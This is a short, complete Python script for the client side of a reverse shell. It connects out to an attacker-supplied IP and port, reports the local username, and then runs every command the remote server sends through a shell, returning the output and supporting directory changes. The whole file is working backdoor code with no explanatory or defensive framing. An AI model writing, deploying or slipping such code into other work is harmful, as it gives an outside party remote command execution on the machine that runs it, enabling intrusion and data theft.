import socket
import subprocess
import os
import sys


def session_handler(sock, target_ip, target_port):
    print(f'[+] Connecting to {target_ip}.')
    sock.connect((target_ip, target_port))
    outbound(sock, os.getlogin())
    print(f'[+] Connected to {target_ip}.')
    while True:
        message = inbound(sock)
        print(f'[+] Message received - {message}')
        if message == 'exit':
            print('[-] The server has terminated the session.')
            sock.close()
            break
        process_message(sock, message)


def process_message(sock, message):
    if message.split(" ")[0] == 'cd':
        change_directory(sock, message)
    elif message == 'background':
        pass
    else:
        execute_command(sock, message)


def change_directory(sock, message):
    try:
        directory = str(message.split(" ")[1])
        os.chdir(directory)
        cur_dir = os.getcwd()
        print(f'[+] Changed to {cur_dir}')
        outbound(sock, cur_dir)
    except FileNotFoundError:
        outbound(sock, 'Invalid directory.  Try again.')


def execute_command(sock, message):
    command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = command.stdout.read() + command.stderr.read()
    outbound(sock, output.decode())


def inbound(sock):
    print('[+] Awaiting response...')
    try:
        message = sock.recv(1024).decode()
        return message
    except Exception:
        sock.close()


def outbound(sock, message):
    response = str(message).encode()
    sock.send(response)


def main():
    try:
        target_ip = sys.argv[1]
        target_port = int(sys.argv[2])
    except IndexError:
        print('[-] Command line argument(s) missing.  Please try again.')
        return

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        session_handler(sock, target_ip, target_port)
    except Exception as e:
        print(e)


if __name__ == '__main__':
    main()
